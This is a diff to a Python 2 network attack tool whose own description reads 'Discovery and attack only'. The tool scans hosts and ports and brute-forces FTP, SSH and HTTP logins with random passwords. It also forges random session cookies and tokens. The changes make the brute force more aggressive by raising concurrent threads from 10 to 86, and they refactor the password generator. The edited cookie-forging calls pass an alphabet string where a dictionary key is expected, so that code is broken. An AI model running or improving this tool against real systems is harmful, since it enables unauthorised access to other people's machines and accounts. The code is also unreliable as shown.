@@ -41,9 +41,15 @@ from argparse import ArgumentParser
 from paramiko import SSHClient, AutoAddPolicy
 from string import digits, ascii_lowercase, uppercase, hexdigits, letters, punctuation
 
-known_ports 	= [21,22,222,2222,255,255,80,443,445,8080,8000]
-letters_digits  = digits + letters
-all		= digits + letters + punctuation
+known_ports 	= [21,22,222,2222,25,80,443,445,8080,8000]
+# [ lower | upper | digits | letters+digits | hex | all ]
+dictionnary	= {'letters+digits':digits + letters,
+		  'all':digits + letters + punctuation,
+		  'digits':digits,
+		  'lower':ascii_lowercase,
+		  'upper':uppercase,
+		  'hex':hexdigits
+		  }
 online  	= {}
 ips_o,pwd	= [],[]
 SYNACK  	= 0x12
@@ -333,37 +339,16 @@ def print_fmt(sentence):
 	lgth = len(sentence)
 	print sentence + '\n' + '-'*(lgth-10)
 
-def pwd_alpha(lgr, mode):
-	if mode == 'lower':
-		return ''.join(ascii_lowercase[randint(0,len(ascii_lowercase)-1)] for i in range(int(lgr)))
-	elif mode == 'upper':
-		return ''.join(uppercase[randint(0,len(uppercase)-1)] for i in range(int(lgr)))
-	elif mode == 'digits':
-		return ''.join(digits[randint(0,len(digits)-1)] for i in range(int(lgr)))
-	elif mode == 'hex':
-		return ''.join(hexdigits[randint(0,len(hexdigits)-1)] for i in range(int(lgr)))
-	elif mode == 'all':
-		return ''.join(all[randint(0,len(all)-1)] for i in range(int(lgr)))
-	else:
-		return ''.join(letters_digits[randint(0,len(letters_digits)-1)] for i in range(int(lgr)))
-
+def pwd_alpha(lgr, length, mode):
+	return ''.join(dictionnary[mode][randint(0,length-1)] for i in range(int(lgr)))
+	
 def generate(mode, lgr):
-	stop = False
-	if mode == 'lower':
-		len_mode = pow(len(ascii_lowercase), int(lgr))
-	elif mode == 'upper':
-		len_mode = pow(len(uppercase), int(lgr))
-	elif mode == 'digits':
-		len_mode = pow(len(digits), int(lgr))
-	elif mode == 'hex':
-		len_mode = pow(len(hexdigits), int(lgr))
-	elif mode == 'all':
-		len_mode = pow(len(all), int(lgr))
-	else:
-		len_mode = pow(len(letters_digits), int(lgr))
+	stop 	 = False
+	length 	 = len(dictionnary[mode])
+	len_mode = pow(length, int(lgr))
 	try:
 		while stop != True:
-			psswd = pwd_alpha(lgr, mode)
+			psswd = pwd_alpha(lgr, length, mode)
 			if psswd not in pwd: pwd.append(psswd)
 			sys.stdout.write('\r\033[96m[BF]\033[0m Remplissage du dictionnaire [/!\\ en mémoire] : ' +
 					 str(len(pwd)) + ' / '+ str(len_mode))
@@ -415,8 +400,8 @@ def query(port, dst):
 			url = 'https://{}'.format(dst)
 		else:
 			url = 'http://{}:{}'.format(dst, port)
-		cooki	= {'spip_session':pwd_alpha(16, 'alpha')}
-		token	= {'token':pwd_alpha(16, 'alpha')}
+		cooki	= {'spip_session':pwd_alpha(16, len(dictionnary['hex']), dictionnary['hex'])}
+		token	= {'token':pwd_alpha(16, len(dictionnary['hex']), dictionnary['hex'])}
 		headers = {'content-type':'application/json'}
 		r = requests.get(url, headers=headers, verify=False)
 		logger.info("\033[92m[STATUS]\033[0m {}: \033[91m{}\033[0m".format(dst, r.status_code))
@@ -771,7 +756,7 @@ def checkhost(ip):
 		else:
 			pass
 	except Exception as e:
-		logger.error("\033[91m[-]\033[0m {}.".format(e.__class__))
+		logger.error("\033[91m[-]\033[0m Erreur Checkhost() --> {}.".format(e.__class__))
 		pass
 
 def network_scan(ip):
@@ -860,7 +845,7 @@ def port_scan(ip):
 		logger.info('\n\033[93m[*]\033[0m Interruption utilisateur.')
 		sys.exit(-1)
 	except Exception as e:
-		logger.error('\n\033[92m[-]\033[0m Erreur port_scan({}): \033[31m{}\033[0m'.format(ip, e))
+		logger.error('\n\033[92m[-]\033[0m Erreur port_scan({}): \033[31m{}\033[0m'.format(ip, e.__class__))
 
 def get_ip():
 	try:
@@ -869,18 +854,21 @@ def get_ip():
 		ret = s.getsockname()[0]
 		s.close()
 		return ret
-	except:
-		sys.exit('\033[91m[-]\033[0m Déconnecté du réseau?\n')
+	except Exception as e:
+		sys.exit('\033[91m[-]\033[0m Déconnecté du réseau? --> {}.\n'.format(e.__class__))
 
 # Arguments handler part ===============================================================================
 def get_args():
-	args = ArgumentParser(version='4.0',description='Discovery and attack only, made by Cesium133.')
+	args = ArgumentParser(version='4.1',
+			description='Discovery and attack only, made by Cesium133.',
+			epilog='GPL(v3) License.')
 	args.add_argument('-b','--bruteforce',
 		action='store_true',
 		default=False,
 		help='Argument optionnel pour déclencher le mode attaque.')
 	args.add_argument('-i','--ip',
 		action='store',
+		metavar='Adresse IP',
 		nargs=1,
 		help='Machine cible.')
 	args.add_argument('-w','--wordlist',
@@ -896,10 +884,11 @@ def get_args():
 		action='store',
 		nargs=1,
 		default=['lower'],
-		help='Alphabet de bruteforce [lower | upper | digits | letters+digits | hex | all].')
+		help='Alphabet de bruteforce [ lower | upper | digits | letters+digits | hex | all ].')
 	args.add_argument('-l','--longueur',
 		action='store',
 		nargs=1,
+		metavar='INTEGER',
 		default=['3'],
 		help='Longueur des mots de passe souhaitée.')
 	return args.parse_args()
@@ -936,7 +925,7 @@ if __name__ == '__main__':
 			print "\n\033[92m[*]\033[0m Mode:", args.mode[0]
 			print "\033[92m[*]\033[0m Longueur des lignes:", args.longueur[0]
 			print "\033[92m[*]\033[0m Pour interrompre le processus et poursuivre les tests -> [CTRL+C]\n"
-			dic = generate(args.mode[0], args.longueur[0])
+			dic = generate(args.mode[0].lower(), args.longueur[0])
 	elif args.bruteforce:
 		print '\n\033[94m[~]\033[0m Pas de ports à bruteforcer [21/22/222/2222].'
 
@@ -956,7 +945,7 @@ if __name__ == '__main__':
 							threads.append(t)
 							t.start()
 							idx += 1
-							if len(threads) >= 10:
+							if len(threads) >= 86:
 								for thr in threads:
 									thr.join()
 								threads = []
@@ -965,9 +954,8 @@ if __name__ == '__main__':
 								break
 					except KeyboardInterrupt:
 						print '\n[*] Nbr d\'essais '+ str(idx)
-						idx = 0
 					except Exception as e:
-						logger.error("\033[91m[-]\033[0m BF FTP.")
+						logger.error("\033[91m[-]\033[0m BF FTP --> {}.".format(e.__class__))
 				idx = 0
 # SSH ----------------------------------------------------------------------------------------------------------
 				if 22 in online[host] or 222 in online[host] or 2222 in online[host]:
@@ -984,7 +972,7 @@ if __name__ == '__main__':
 							threads.append(t)
 							conn.start()
 							idx += 1
-							if len(threads) >= 10:
+							if len(threads) >= 86:
 								for thr in threads:
 									thr.join()
 								threads = []
@@ -993,9 +981,9 @@ if __name__ == '__main__':
 								break
 					except KeyboardInterrupt:
 						print '\n\n[*] Nbr d\'essais '+ str(idx)
-						idx = 0
 					except Exception as e:
-						logger.error("\033[91m[-]\033[0m BF SSH")
+						logger.error("\033[91m[-]\033[0m BF SSH --> {}.".format(e.__class__))
+				idx = 0
 # HTTP ---------------------------------------------------------------------------------------------------------
 			if 80 in online[host] or 8000 in online[host] or 8080 in online[host]:
 				port_idx = [x for i,x in enumerate(online[host]) if x == 8080 or x == 8000 or x == 80]
